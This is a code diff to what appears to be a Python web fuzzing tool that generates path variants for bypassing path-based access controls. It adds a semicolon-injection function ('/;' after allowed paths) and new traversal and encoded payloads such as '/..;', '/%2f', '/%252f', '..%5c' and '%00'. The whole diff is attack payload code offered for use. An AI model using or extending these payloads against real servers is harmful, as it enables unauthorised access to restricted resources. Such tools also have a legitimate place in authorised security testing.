@@ -21,7 +21,13 @@ def insertBetweenSlashes(path):
 
     return newpaths
 
+def semicolonAfterOkpath(path,okpaths):
+    newpaths = set()
+    for okpath in okpaths:
+        newpath = okpath + "/;" + path.lstrip("/")
+        newpaths.add(newpath)
 
+    return  newpaths
 
 def lastShowTwice(path):
     payloads = '''
@@ -70,6 +76,10 @@ def addPrefix(path):
 /..
 /../..
 /../../..
+/..;
+/%2f
+/%2e%2f
+/%252f
 '''
     payloads = list(filter(None,payloads.split('\n')))
     newpaths = set()
@@ -111,6 +121,11 @@ def appendBackfix(path):
 %09
 %00
 %03
+%23
+..%ff
+..%5c
+.%2e
+%3f
 %08
 %10
 %83
@@ -202,6 +217,7 @@ def processPath(path,okpaths):
     if okpaths:
         payload_paths.update(traversalFromOkPath(path, okpaths))
         payload_paths.update(traversalFromOkpath2(path, okpaths))
+        payload_paths.update(semicolonAfterOkpath(path,okpaths))
 
     return payload_paths
 
